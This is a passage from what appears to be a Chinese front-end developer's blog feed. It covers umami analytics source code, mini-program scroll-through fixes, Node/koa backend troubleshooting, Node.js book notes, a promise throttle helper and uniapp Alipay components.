<span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">trackingDisabled</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 监听 pushState，replaceState 事件</span>    history<span class="token punctuation">.</span>pushState <span class="token operator">=</span> <span class="token function">hook</span><span class="token punctuation">(</span>history<span class="token punctuation">,</span> <span class="token string">'pushState'</span><span class="token punctuation">,</span> handlePush<span class="token punctuation">)</span><span class="token punctuation">;</span>    history<span class="token punctuation">.</span>replaceState <span class="token operator">=</span> <span class="token function">hook</span><span class="token punctuation">(</span>history<span class="token punctuation">,</span> <span class="token string">'replaceState'</span><span class="token punctuation">,</span> handlePush<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> update <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>      console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">'update'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>document<span class="token punctuation">.</span>readyState <span class="token operator">===</span> <span class="token string">'complete'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">'complete'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">trackView</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>cssEvents<span class="token punctuation">)</span> <span class="token punctuation">{</span>          <span class="token function">addEvents</span><span class="token punctuation">(</span>document<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">observeDocument</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span>    document<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'readystatechange'</span><span class="token punctuation">,</span> update<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">update</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span></code></pre><p>这里最终会在<code>document.readyState === &#39;complete&#39;</code>时候，去做事件监听绑定等操作，发送第一次页面上报。<br>有一点不理解，为什么已经监听了<code>readystatechange</code>，还是又手动执行了一次<code>update()</code></p><h2 id="监听路由改变"><a href="#监听路由改变" class="headerlink" title="监听路由改变"></a>监听路由改变</h2><pre class=" language-js"><code class="language-js"><span class="token keyword">export</span> <span class="token keyword">const</span> hook <span class="token operator">=</span> <span class="token punctuation">(</span>_this<span class="token punctuation">,</span> method<span class="token punctuation">,</span> callback<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  <span class="token keyword">const</span> orig <span class="token operator">=</span> _this<span class="token punctuation">[</span>method<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token operator">...</span>args<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    callback<span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> orig<span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span>_this<span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><p><code>history.pushState</code> hook劫持，为了在原生方法执行前，执行callback。这样实现了对原生 history 的监听。<code>handlePush</code> 方法会执行上报方法 trackView。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>整体代码比较简单，清晰，无侵入性的实现了网站统计。</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> umami </tag>
            
            <tag> 源码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小程序中的滚动穿透</title>
      <link href="/2022/04/18/front-end/mini-scroll-through/"/>
      <url>/2022/04/18/front-end/mini-scroll-through/</url>
      
        <content type="html"><![CDATA[<p>在小程序开发中，弹出层滚动穿透是个比较棘手的问题。如下图，蓝色部分滚动，底部也跟着一起滚动，就是滚动穿透。</p><p>常见的处理方法比如，禁止滚动，并不生效。而给主体加 <code>overflow: hidden</code> 又会导致主体滚动条高度为 0，需要关闭时候记录滚动条位置，体验也不好。</p><p><img src="/images/2022/04/18/16502908272281.jpg"></p><h2 id="touch-action"><a href="#touch-action" class="headerlink" title="touch-action"></a>touch-action</h2><table><thead><tr><th>值</th><th>描述</th></tr></thead><tbody><tr><td>auto</td><td>启用</td></tr><tr><td>none</td><td>禁用</td></tr><tr><td>pan-x</td><td>启用单指水平移动</td></tr><tr><td>pan-y</td><td>启用垂直手势</td></tr><tr><td>manipulation</td><td>浏览器只允许进行滚动和持续缩放操作。任何其它被auto值支持的行为不被支持。启用平移和缩小缩放手势，但禁用其他非标准手势，例如双击以进行缩放。 禁用双击可缩放功能可减少浏览器在用户点击屏幕时延迟生成点击事件的需要。</td></tr><tr><td>pinch-zoom</td><td>启用多手指平移和缩放页面</td></tr><tr><td>pan-left, pan-right,pan-up,pan-down</td><td>启用指定方向滚动开始的单指手势</td></tr></tbody></table><p>在 mask 和 popup 元素上面禁用即可：</p><pre class=" language-css"><code class="language-css"><span class="token selector"><span class="token class">.mask</span>, <span class="token class">.popup</span> </span><span class="token punctuation">{</span>    <span class="token property">touch-action</span><span class="token punctuation">:</span> none<span class="token punctuation">}</span></code></pre><p>这里和 overflow 方式类似，都不是特别好的办法，能解决部分问题，但是不完美。</p><p><strong>注意</strong>：这里适合 popup 内部没有滚动的情况</p><h2 id="禁止冒泡和默认行为"><a href="#禁止冒泡和默认行为" class="headerlink" title="禁止冒泡和默认行为"></a>禁止冒泡和默认行为</h2><p>preventDefault：阻止默认滚动动作的执行。<br>stopPropagation: 阻止冒泡，阻止事件由下向上传递。</p><p>实现上，小程序这里需要借助 sjs 的能力来实现：<br>sjs 文件：</p><pre class=" language-js"><code class="language-js"><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> sjs 文件 <span class="token operator">--</span><span class="token operator">></span><span class="token keyword">function</span> <span class="token function">disableScroll</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">{</span>  e<span class="token punctuation">.</span><span class="token function">preventDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">enableScroll</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment" spellcheck="true">// 阻止冒泡</span>  e<span class="token punctuation">.</span><span class="token function">stopPropagation</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token punctuation">{</span>  disableScroll<span class="token punctuation">,</span>  enableScroll<span class="token punctuation">}</span></code></pre><p>axml文件：</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>import-sjs</span> <span class="token attr-name">from</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>./index.sjs<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>sjs<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>view</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>wrapper<span class="token punctuation">"</span></span> <span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>view</span> <span class="token attr-name"><span class="token namespace">a:</span>for</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>{{[1, 2, 3, 4, 5, 6, 7, 8, 9]}}<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">a:</span>for-item</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>i<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>view</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>item<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>{{i}}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>view</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>view</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>view</span> <span class="token attr-name">onTouchMove</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>{{sjs.disableScroll}}<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>view</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>mask<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>view</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>popup<span class="token punctuation">"</span></span> <span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>scroll-view</span> <span class="token attr-name">scroll-y</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>popup-scroll<span class="token punctuation">"</span></span> <span class="token attr-name">onTouchMove</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>{{sjs.enableScroll}}<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>view</span> <span class="token attr-name"><span class="token namespace">a:</span>for</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>{{[1, 2, 3, 4, 5, 6, 7, 8, 9]}}<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">a:</span>for-item</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>i<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>view</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>item2<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>{{i}}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>view</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>view</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>scroll-view</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>view</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>view</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>view</span><span class="token punctuation">></span></span></code></pre><p>或者，我们把阻止默认事件放到 mask 层上面，那么下面的 scroll-veiw 不处理，也能够正常滚动</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>import-sjs</span> <span class="token attr-name">from</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>./index.sjs<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>sjs<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>view</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>wrapper<span class="token punctuation">"</span></span> <span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>view</span> <span class="token attr-name"><span class="token namespace">a:</span>for</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>{{[1, 2, 3, 4, 5, 6, 7, 8, 9]}}<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">a:</span>for-item</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>i<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>view</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>item<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>{{i}}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>view</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>view</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>view</span> <span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>view</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>mask<span class="token punctuation">"</span></span> <span class="token attr-name">onTouchMove</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>{{sjs.disableScroll}}<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>view</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>popup<span class="token punctuation">"</span></span> <span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>scroll-view</span> <span class="token attr-name">scroll-y</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>popup-scroll<span class="token punctuation">"</span></span> <span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>view</span> <span class="token attr-name"><span class="token namespace">a:</span>for</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>{{[1, 2, 3, 4, 5, 6, 7, 8, 9]}}<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">a:</span>for-item</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>i<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>view</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>item2<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>{{i}}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>view</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>view</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>scroll-view</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>view</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>view</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>view</span><span class="token punctuation">></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小程序 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>H5-dooring 后端常见问题</title>
      <link href="/2022/01/23/back-endback-end-node-high-cpu/"/>
      <url>/2022/01/23/back-endback-end-node-high-cpu/</url>
      
        <content type="html"><![CDATA[<p>H5-dooring 后端是 koa2，数据库是直接读写的本地json文件，没有sql，没有redis。我们上线之后，一直有各种各样的问题，简单梳理下，不涉及具体代码，不涉及业务细节。</p><h2 id="pm2-频繁重启"><a href="#pm2-频繁重启" class="headerlink" title="pm2 频繁重启"></a>pm2 频繁重启</h2><p>日志文件是直接读写，没有按照时间分割，导致日志文件暴增，node 可用内存64位一般情况下是 1.4g，当内存溢出时候，直接导致 node 进程退出，pm2 频繁重启</p><h2 id="高-cpu"><a href="#高-cpu" class="headerlink" title="高 cpu"></a>高 cpu</h2><p>引入的 koa-compose 配置有问题，一直占据 cpu 时间片，200并发就能导致 cpu 100%，去除之后正常。</p><h2 id="静态文件处理"><a href="#静态文件处理" class="headerlink" title="静态文件处理"></a>静态文件处理</h2><p>静态文件使用 koa-static 处理，虽然也没啥大问题，但是效率明显偏低，静态文件，我们换成了 nginx，koa 只处理接口请求。</p><h2 id="缺少缓存"><a href="#缺少缓存" class="headerlink" title="缺少缓存"></a>缺少缓存</h2><p>频繁读写本地 json 文件，没有使用缓存（比如 Redis），性能不友好，对高并发的 H5 接口，我们加了内存缓存。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个项目的排查，学了不少后端的知识，H5-dooring 这个项目，前端挺美的，后端嘛，😝😝😝</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> koa </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>深入浅出 nodejs</title>
      <link href="/2022/01/23/reading/deepinnodejs/"/>
      <url>/2022/01/23/reading/deepinnodejs/</url>
      
        <content type="html"><![CDATA[<p><img src="/images/2022/01/23/nodejs.jpeg" alt="nodejs"></p><h2 id="没有白看的书"><a href="#没有白看的书" class="headerlink" title="没有白看的书"></a>没有白看的书</h2><p>这本书买了五六年了，以前硬着头皮看，做的笔记，批注，到处是困惑，没有白走的路，学不会的总有一天我会把你学会，学不会的，只是必不可少的铺垫。</p><p>最近定位 H5-dooring 的server 端问题，才把这本书看完，挺好的一本中文技术书。以前 node 没有经验，完全看不懂，这两年在 nestjs 上面花了比较多的时间，初略写了一点 node 的东西，再回头看这本书，才看懂了一点。</p><p>书的章节并不是顺序的，可以跳着看，第二章 C++ 模块现在还是看不懂，索性直接跳过。</p><h2 id="笔记"><a href="#笔记" class="headerlink" title="笔记"></a>笔记</h2><h3 id="第五章-内存控制"><a href="#第五章-内存控制" class="headerlink" title="第五章 内存控制"></a>第五章 内存控制</h3><ul><li>v8 有内存限制，32位系统下约为 0.7G，64位系统下约为 1.4G，使用超过限制会导致进程退出。</li><li>v8 的内存分为新生代和老生带。<ul><li>新生代主要通过 Scavenge 算法，通过牺牲空间换区时间的方式进行垃圾回收。</li><li>老生代主要通过 Mark—Sweep（标记清除，只清除死亡对象，较快，导致内存空间不连续），在空间不足以使用 Mark-Sweep 时候，使用Mark-Compact（标记整理，较慢，内存空间连续） 进行垃圾回收。</li></ul></li><li>Buffer 对象不同于其他对象，不经过 v8 的内存分配机制，不会有堆内存大小的限制</li></ul><h3 id="第六章-理解-Buffer"><a href="#第六章-理解-Buffer" class="headerlink" title="第六章 理解 Buffer"></a>第六章 理解 Buffer</h3><ul><li>Buffer 是一个类 Array 的对象，但它主要用于操作字节，是二进制数据。</li><li>Buffer 支持的编码类型可以通过 <code>toString</code> 方法转为字符串，不支持的编码，如 GBK，GB2312 会乱码</li><li>字符宽度，导致 Buffer 不能直接破解，要使用 <code>Buffer.concat</code> 结合数组操作进行拼接。</li><li>Buffer 传输性能比直接传递字符串要高</li></ul><h3 id="第七章-网络编程"><a href="#第七章-网络编程" class="headerlink" title="第七章 网络编程"></a>第七章 网络编程</h3><ul><li>三次握手通过 <code>socket</code> 实现，node 中也不例外</li></ul><h3 id="第九章-玩转进程"><a href="#第九章-玩转进程" class="headerlink" title="第九章 玩转进程"></a>第九章 玩转进程</h3><ul><li>创建子进程<ul><li><code>spawn()</code>: 启动一个子进程来执行命令</li><li><code>exec()</code>: 启动一个子进程来执行命令，与 <code>spawn()</code> 不同的是其接口不同，它有一个回调接口获悉子进程的情况</li><li><code>execFile()</code>: 启动一个子进程来执行可执行文件</li><li><code>fork()</code>: 与 <code>spawn()</code> 类似，不同点在于它创建 Node 的子进程只需要指定要执行的 JavaScript 文件模块即可</li></ul></li><li>进程间通讯<ul><li>IPC</li><li>句柄传递</li></ul></li><li>状态共享<ul><li>Redis 等</li><li>主动通知</li><li>Cluster（Pm2 用的它）</li></ul></li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这本书遇到问题的时候可以多翻翻，各方面都有涉及，当然毕竟是块 10 年的书了，底层，方法论都没有问题，具体的工具性的东西可能需要多搜索下。</p>]]></content>
      
      
      <categories>
          
          <category> reading </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 阅读 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>抛弃 loadsh，封装更现代的防抖、节流</title>
      <link href="/2021/11/16/front-end/promise-throttle/"/>
      <url>/2021/11/16/front-end/promise-throttle/</url>
      
        <content type="html"><![CDATA[<h2 id="一般意义上的防抖节流"><a href="#一般意义上的防抖节流" class="headerlink" title="一般意义上的防抖节流"></a>一般意义上的防抖节流</h2><h3 id="函数防抖（debounce）"><a href="#函数防抖（debounce）" class="headerlink" title="函数防抖（debounce）"></a>函数防抖（debounce）</h3><p>函数防抖，就是指触发事件后，在 n 秒后只能执行一次，如果在 n 秒内又触发了事件，则会重新计算函数的执行时间。简单的说，当一个动作连续触发，只执行最后一次。</p><h3 id="函数节流（throttle）"><a href="#函数节流（throttle）" class="headerlink" title="函数节流（throttle）"></a>函数节流（throttle）</h3><p>限制一个函数在一定时间内只能执行一次</p><h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><p>lodash 里面提供了非常完备的实现，核心是使用定时器去延迟函数的执行</p><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><ol><li>这样的防抖节流，只能屏蔽某一个时间段的特定操作。我们的点击，往往后面是一个网络请求，如果网络请求的事件长于这个时间，那么就可能出现防抖失效的情况。持续间隔点击按钮，可能会短时间内给后端发送多个请求，如果业务场无法保证幂等，就会出现问题。</li><li>ui 交互中，防抖实际上是延迟函数的执行，某些场景，会让人觉得卡顿，如果对交互的要求比较高，需要严格控制防抖的时间，一般不超过 200ms</li></ol><h2 id="如何防御"><a href="#如何防御" class="headerlink" title="如何防御"></a>如何防御</h2><p>简单的实现，在业务代码中设置标志位，当有 promise 执行的时候，执行锁，等 promise 执行完毕，再释放锁。缺点，需要在业务中写很多重复的代码。</p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">const</span> status <span class="token operator">=</span> <span class="token boolean">false</span><span class="token keyword">function</span> <span class="token function">btnClick</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>status<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//   do something</span>    status <span class="token operator">=</span> ture  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h2 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h2><p>我们可以参考防抖的实现，进行封装, 把函数用 Promise 进行包裹，然后设置标志位，就可以避免在业务中频繁设置标志位。<br>节流，我们可以设置函数执行的时候，同时执行一个定时器，也用 Promise 进行包装，当两个 Promise 都执行完毕的时候，再释放函数。</p><pre class=" language-typescript"><code class="language-typescript"><span class="token comment" spellcheck="true">/** * promise 节流函数版本 * @param fn * @param time * @param delayTime * @constructor */</span><span class="token keyword">function</span> <span class="token function">PromiseThrottleFn</span><span class="token punctuation">(</span>fn<span class="token punctuation">:</span> <span class="token keyword">Function</span><span class="token punctuation">,</span> time <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> delayTime <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">let</span> status <span class="token operator">=</span> <span class="token string">''</span>  <span class="token keyword">return</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>status <span class="token operator">===</span> <span class="token string">'lock'</span><span class="token punctuation">)</span> <span class="token keyword">return</span>    status <span class="token operator">=</span> <span class="token string">'lock'</span>    <span class="token keyword">try</span> <span class="token punctuation">{</span>      <span class="token keyword">const</span> data <span class="token operator">=</span> Promise<span class="token punctuation">.</span><span class="token function">all</span><span class="token punctuation">(</span><span class="token punctuation">[</span>        <span class="token comment" spellcheck="true">// @ts-ignore</span>        fn<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> <span class="token operator">...</span>arguments<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span>resolve<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>          <span class="token function">setTimeout</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> time<span class="token punctuation">)</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>      <span class="token punctuation">]</span><span class="token punctuation">)</span>      <span class="token comment" spellcheck="true">// @ts-ignore</span>      <span class="token keyword">return</span> data<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{</span>      <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>        status <span class="token operator">=</span> <span class="token string">''</span>      <span class="token punctuation">}</span><span class="token punctuation">,</span> delayTime<span class="token punctuation">)</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>函数我放到了个人的工具函数库中，可以直接通过 npm 安装：</p><pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">// 安装</span>npm install @aocoding<span class="token operator">/</span>victorinox<span class="token comment" spellcheck="true">// 使用</span><span class="token keyword">import</span> <span class="token punctuation">{</span> PromiseThrottleFn <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@aocoding/victorinox'</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> promise </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>uniapp 中支付宝小程序自定义组件的调用</title>
      <link href="/2021/09/26/front-end/uniapp-alipay-mini/"/>
      <url>/2021/09/26/front-end/uniapp-alipay-mini/</url>
      
        <content type="html"><![CDATA[<p>uniapp 这个缝合怪，挺厉害的，啥都能做，甚至你能够使用小程序的原生组件。<br>具体文档：<br><a href="https://uniapp.dcloud.io/frame?id=%E5%B0%8F%E7%A8%8B%E5%BA%8F%E8%87%AA%E5%AE%9A%E4%B9%89%E7%BB%84%E4%BB%B6%E6%94%AF%E6%8C%81" target="_blank" rel="noopener">https://uniapp.dcloud.io/frame?id=%e5%b0%8f%e7%a8%8b%e5%ba%8f%e8%87%aa%e5%ae%9a%e4%b9%89%e7%bb%84%e4%bb%b6%e6%94%af%e6%8c%81</a></p><h2 id="调用坑"><a href="#调用坑" class="headerlink" title="调用坑"></a>调用坑</h2><p>写法1：</p><pre class=" language-js"><code class="language-js"><span class="token operator">&lt;</span>example @<span class="token keyword">get</span><span class="token operator">=</span><span class="token string">"onGet"</span> <span class="token operator">/</span><span class="token operator">></span></code></pre><p>如果这样写，那么会走向 uniapp 的事件分发，但是支付宝这里事件的默认参数是 undefined，拿不到事件信息，所以这里会抛出 js 异常</p><p>写法2：</p><pre class=" language-js"><code class="language-js"><span class="token operator">&lt;</span>example onGet<span class="token operator">=</span><span class="token string">"onGet"</span> <span class="token operator">/</span><span class="token operator">></span></code></pre><p>使用小程序原生写法，会报 <code>event not found</code>,这是因为 uniapp 对事件有自己的封装，没有直接暴露给小程序，添加以下模板代码之后，可以调用成功：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">this</span><span class="token punctuation">.</span>$scope<span class="token punctuation">.</span>onGet <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>onGet<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span></code></pre><h2 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h2><p>如果使用组件比较多，模板代码可以放到 webpack loader 中去实现，思路就是模板中使用 <code>onGet</code> 写法的通过正则找出来，然后再 <code>onLoad()</code> 中挂载上去。</p><p>当我写好了 loader，并且 uniapp 编译成功之后，打开小程序编译器，迎接秋天的美好的时候</p><p><img src="/images/16326137933990.jpg"></p><p><img src="/images/a.gif" alt="a"></p><p>悲剧…一天就这样过去了…啊啊啊！！！</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小程序 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript 悟道读后感</title>
      <link href="/2021/08/22/reading/how-javascript-works/"/>
      <url>/2021/08/22/reading/how-javascript-works/</url>
      
